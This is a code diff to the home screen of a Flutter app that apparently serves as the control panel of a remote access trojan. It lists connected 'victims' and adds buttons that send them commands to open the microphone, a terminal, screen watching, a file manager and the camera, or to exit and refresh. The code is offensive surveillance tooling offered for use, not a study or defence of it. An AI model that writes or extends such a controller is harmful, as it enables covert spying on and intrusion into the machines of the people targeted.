@@ -25,6 +25,10 @@ class _HomeViewState extends ConsumerState<HomeView> {
 
   @override
   Widget build(BuildContext context) {
+    ref
+        .watch(serverSocketProvider)
+        .victims
+        .removeWhere((victim) => !victim.active);
     return Scaffold(
       body: ref.watch(serverSocketProvider).serverSocket == null
           ? _configForm()
@@ -91,14 +95,25 @@ class _HomeViewState extends ConsumerState<HomeView> {
             children: [
               IconButton(
                   icon: const Icon(Icons.keyboard_voice),
-                  onPressed: () {
-                    victim.soket.write("Hello");
-                  }),
-              const IconButton(icon: Icon(Icons.terminal), onPressed: null),
-              const IconButton(
-                  icon: Icon(Icons.desktop_windows), onPressed: null),
-              const IconButton(icon: Icon(Icons.folder), onPressed: null),
-              const IconButton(icon: Icon(Icons.camera_alt), onPressed: null),
+                  onPressed: () => victim.send("voice")),
+              IconButton(
+                  icon: const Icon(Icons.terminal),
+                  onPressed: () => victim.send("terminal")),
+              IconButton(
+                  icon: const Icon(Icons.desktop_windows),
+                  onPressed: () => victim.send("watch")),
+              IconButton(
+                  icon: const Icon(Icons.folder),
+                  onPressed: () => victim.send("file_manager")),
+              IconButton(
+                  icon: const Icon(Icons.camera_alt),
+                  onPressed: () => victim.send("camera")),
+              IconButton(
+                  icon: const Icon(Icons.cancel),
+                  onPressed: () => victim.send("exit")),
+              IconButton(
+                  icon: const Icon(Icons.refresh),
+                  onPressed: () => victim.send("refresh"))
             ],
           ),
         );
